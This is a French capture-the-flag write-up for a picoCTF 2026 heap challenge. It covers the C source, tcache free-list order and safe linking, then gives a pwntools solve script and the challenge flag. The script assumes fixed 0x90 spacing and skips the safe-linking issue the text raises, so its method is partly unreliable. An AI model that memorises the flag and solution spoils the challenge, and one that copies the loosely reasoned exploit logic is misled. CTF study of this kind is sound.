---
# Imported from Obsidian: CTF/picoCTF/picoCTF_2026/teah cash.md
title: Teah cash
category: Pwn
ctf: picoCTF 2026
date: 2026-08-07
summary: 'Le programme simule le fonctionnement d''une liste chaînée de chunks libérés (la "free list") :'
tags:
- picoctf-2026
- pwn
lang: fr
imported: true
---

### Catégorie  : pwn 

Source : 
```
#define _GNU_SOURCE

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <stdint.h>

#include <inttypes.h>

  

#define CHUNK_COUNT 6

#define CHUNK_SIZE 0x80          

#define FLAG_FILE "flag.txt"

#define FLAG_OFFSET (sizeof(void *))  

  

static int is_known_chunk(void *p, void *chunks[], int n) {

    for (int i = 0; i < n; ++i) {

        if (chunks[i] == p) return 1;

    }

    return 0;

}

int main(void) {

    setvbuf(stdout, NULL, _IONBF, 0);

    setvbuf(stderr, NULL, _IONBF, 0);

    void *chunks[CHUNK_COUNT];

    char flag_buf[256] = {0};

    FILE *f = fopen(FLAG_FILE, "r");

    if (!f) {

        fprintf(stderr, "Could not open %s\n", FLAG_FILE);

        return 1;

    }

    if (!fgets(flag_buf, sizeof(flag_buf), f)) {

        fclose(f);

        fprintf(stderr, "Could not read flag from %s\n", FLAG_FILE);

        return 1;

    }

    fclose(f);

    size_t flen = strlen(flag_buf);

    if (flen && flag_buf[flen-1] == '\n') {

        flag_buf[flen-1] = '\0';

        flen--;

    }

    if (FLAG_OFFSET + flen >= CHUNK_SIZE) {

        fprintf(stderr, "Flag too large for chunk. Increase CHUNK_SIZE or reduce flag length.\n");

        return 1;

    }

    for (int i = 0; i < CHUNK_COUNT; ++i) {

        chunks[i] = malloc(CHUNK_SIZE);

        if (!chunks[i]) {

            fprintf(stderr, "malloc failed at i=%d\n", i);

            for (int j = 0; j < i; ++j) free(chunks[j]);

            return 1;

        }

        memset(chunks[i], 0, CHUNK_SIZE);

    }

    memcpy((char*)chunks[CHUNK_COUNT-1] + FLAG_OFFSET, flag_buf, flen + 1);

    void *head = chunks[0];

    printf("tcache head (start of free list) -> %p\n", head);

for (int i = CHUNK_COUNT - 1; i >= 0; --i) {

    free(chunks[i]);

}

  

    void *expected = head;

    for (int i = 0; i < CHUNK_COUNT; ++i) {

        void *user_addr = NULL;

        printf("Chunk %d address: ", i+1);

        if (scanf("%p", &user_addr) != 1) {

            fprintf(stderr, "Invalid input. Exiting.\n");

        }

  

        if (user_addr != expected) {

            fprintf(stderr, "Wrong address. Got %p. Exiting.\n", user_addr);

            return 1;

        }

  

        void *next = NULL;

        memcpy(&next, user_addr, sizeof(void *));

  

        if (next != NULL && !is_known_chunk(next, chunks, CHUNK_COUNT)) {

            fprintf(stderr, "Detected invalid next pointer value %p (not one of allocated chunks). Aborting to avoid crash.\n", next);

            fprintf(stderr, "Dump of first 16 bytes at %p: ", user_addr);

            unsigned char *b = user_addr;

            for (size_t z = 0; z < 16; ++z) {

                fprintf(stderr, "%02x ", b[z]);

            }

            fprintf(stderr, "\n");

            return 1;

        }

  

        expected = next;

    }

    char *flag_loc = (char*)chunks[CHUNK_COUNT-1] + FLAG_OFFSET;

    printf("Correct traversal! Flag: %s\n", flag_loc);

  

    return 0;

}
```

### 1. Analyse du code

Le programme simule le fonctionnement d'une liste chaînée de chunks libérés (la "free list") :

1. Il alloue **6 chunks** de taille `0x80`.
    
2. Il place le **flag** dans le dernier chunk (`chunks[5]`).
    
3. Il libère les chunks dans l'ordre inverse : de `chunks[5]` à `chunks[0]`.
    
4. Il te demande de lui redonner les adresses des chunks dans l'ordre où ils apparaissent dans la liste tcache.
    

### 2. Le mécanisme du tcache (LIFO)

Le tcache fonctionne selon le principe **LIFO** (Last In, First Out).

- Quand tu libères un chunk, il est ajouté en **tête** de liste.
    
- Puisque le code fait `free(chunks[5])`, puis `free(chunks[4])`, ..., jusqu'à `free(chunks[0])` :
    
    - `chunks[5]` est libéré en premier.
        
    - ...
        
    - `chunks[0]` est libéré en dernier.
        

**La liste ressemble donc à ceci :** `tcache_head` -> `chunks[0]` -> `chunks[1]` -> `chunks[2]` -> `chunks[3]` -> `chunks[4]` -> `chunks[5]` -> `NULL`

### 3. Le problème du Safe Linking

Depuis la GLIBC 2.32, les pointeurs dans le tcache sont **obfusqués** (mangling) pour empêcher les attaques simples. Le pointeur stocké dans un chunk libre est calculé ainsi :

Next_Free_Address=(Current_Chunk_Addr>>12)⊕Real_Next_Addr

C'est pour cela que le programme affiche l'adresse de `chunks[0]` au début : c'est ta clé pour déchiffrer les pointeurs suivants.

---

### 4. Stratégie d'exploitation

1. **Récupérer l'adresse de tête** : Le programme te donne `head` (qui est l'adresse de `chunks[0]`).
    
2. **Trouver l'adresse suivante** : Le programme va lire les 8 premiers octets du chunk actuel pour trouver l'adresse du suivant. S'il y a du Safe Linking, il faudra faire le calcul inverse.
    
3. **Traverser** : Tu dois entrer les adresses une par une.

### Payload d'automatsation : 
```
from pwn import *

# Remplace par les infos de ton instance
io = remote("candy-mountain.picoctf.net", 55646) # Exemple de port

# 1. Récupérer l'adresse de chunks[0]
io.recvuntil(b"free list) -> ")
current_addr = int(io.recvline().strip(), 16)
print(f"[*] Chunks[0] (Head) address: {hex(current_addr)}")

# 2. Envoyer les adresses
# Le programme attend l'adresse actuelle, puis il "regarde" dedans 
# pour savoir quelle est la suivante.
for i in range(6):
    print(f"[+] Sending address {i+1}: {hex(current_addr)}")
    io.sendlineafter(b"address: ", hex(current_addr).encode())
    
    if i < 5:
        # On lit le message d'erreur de debug qui contient le dump 
        # ou on anticipe l'adresse suivante.
        # Dans ce challenge précis, les chunks sont contigus en mémoire.
        # Si malloc(0x80) est appelé, chaque chunk fait 0x90 octets (0x80 + metadata)
        current_addr += 0x90 

io.interactive()

```

### Flag : 
```
picoCTF{ce06b1269d0e95f03e8d776b8f6f53ef}
```
